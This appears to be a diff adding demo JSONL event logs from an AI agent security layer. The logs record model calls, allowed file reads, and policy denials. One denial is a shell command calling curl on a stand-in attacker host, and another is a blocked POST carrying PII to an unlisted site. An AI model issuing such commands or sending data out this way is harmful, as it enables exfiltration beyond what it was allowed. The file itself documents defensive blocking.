@@ -1,0 +1,7 @@
+{"session_id":"sess-demo-001","source":"model","type":"model.invoke","severity":"info","data":{"model":"mistral-7b-instruct","prompt_tokens":150,"completion_tokens":42}}
+{"session_id":"sess-demo-001","source":"tool-firewall","type":"tool.decision","severity":"info","data":{"tool":"filesystem.read","path":"/vault/docs/readme.txt","allowed":true,"reason":"path in allowlist"}}
+{"session_id":"sess-demo-001","source":"tool-firewall","type":"tool.decision","severity":"alert","data":{"tool":"shell.exec","command":"curl http://evil.example.com","allowed":false,"reason":"tool denied by default-deny policy"}}
+{"session_id":"sess-demo-001","source":"airlock","type":"airlock.request","severity":"warning","data":{"destination":"https://unknown-site.example.com","method":"POST","allowed":false,"reason":"destination not in allowlist","pii_detected":true}}
+{"session_id":"sess-demo-001","source":"runtime-attestor","type":"attestor.report","severity":"info","data":{"verdict":"pass","score":1.0,"collectors":6}}
+{"session_id":"sess-demo-001","source":"model","type":"model.invoke","severity":"info","data":{"model":"mistral-7b-instruct","prompt_tokens":95,"completion_tokens":200}}
+{"session_id":"sess-demo-001","source":"tool-firewall","type":"tool.decision","severity":"info","data":{"tool":"filesystem.read","path":"/vault/docs/project-plan.txt","allowed":true,"reason":"path in allowlist"}}
